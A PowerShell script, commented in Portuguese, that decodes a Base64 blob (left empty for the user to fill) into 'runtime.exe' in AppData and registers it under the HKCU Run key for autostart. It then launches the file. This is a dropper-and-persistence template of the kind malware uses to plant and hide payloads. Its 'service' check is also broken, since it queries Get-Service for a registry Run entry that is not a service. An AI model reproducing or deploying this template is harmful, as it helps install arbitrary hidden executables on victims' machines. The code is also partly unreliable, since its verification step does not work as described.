# Função para decodificar Base64 e salvar como EXE
function Decode-Base64ToExe {
    param(
        [string]$Base64Content,  # Conteúdo Base64
        [string]$OutputFilePath  # Caminho para salvar o EXE
    )

    $DecodedBytes = [Convert]::FromBase64String($Base64Content)
    [System.IO.File]::WriteAllBytes($OutputFilePath, $DecodedBytes)
}

# Definindo o caminho para salvar o EXE em AppData do usuário atual
$outputFile = [System.IO.Path]::Combine($env:APPDATA, 'runtime.exe')

# Base64 do arquivo EXE (substitua com o Base64 real do seu arquivo)
$Base64Data = ""

# Gerar o EXE a partir do Base64
Decode-Base64ToExe -Base64Content $Base64Data -OutputFilePath $outputFile

# Função para criar o serviço no registro do Windows
function Create-StartupService {
    param(
        [string]$ExePath  # Caminho do EXE gerado
    )

    # Caminho para a chave do registro de inicialização
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $serviceName = "runtime"  # Nome do serviço como 'runtime'

    # Adicionar o serviço ao registro para iniciar automaticamente
    Set-ItemProperty -Path $regPath -Name $serviceName -Value $ExePath
    Write-Host "Serviço 'runtime' adicionado ao registro para inicialização automática."
}

# Criar serviço de inicialização no registro
Create-StartupService -ExePath $outputFile

# Função para verificar se o serviço está no registro e se está ativo
function Verify-Service {
    param(
        [string]$ServiceName  # Nome do serviço a ser verificado
    )

    # Verificar se o serviço existe no registro e se está configurado para iniciar automaticamente
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($service) {
        Write-Host "Serviço '$ServiceName' encontrado."
        Write-Host "Status do serviço: $($service.Status)"
        
        # Verificar se o serviço está configurado para iniciar automaticamente
        $serviceStartType = (Get-Service -Name $ServiceName).StartType
        Write-Host "Tipo de inicialização: $serviceStartType"

        if ($serviceStartType -eq "Automatic") {
            Write-Host "O serviço está configurado para iniciar automaticamente com o Windows."
        } else {
            Write-Host "O serviço não está configurado para iniciar automaticamente."
        }
    } else {
        Write-Host "Serviço '$ServiceName' não encontrado."
    }
}

# Verificar se o serviço 'runtime' foi criado corretamente
Verify-Service -ServiceName "runtime"

# Iniciar o EXE gerado
Start-Process -FilePath $outputFile

Write-Host "Arquivo gerado em AppData e serviço 'runtime' criado com sucesso!"
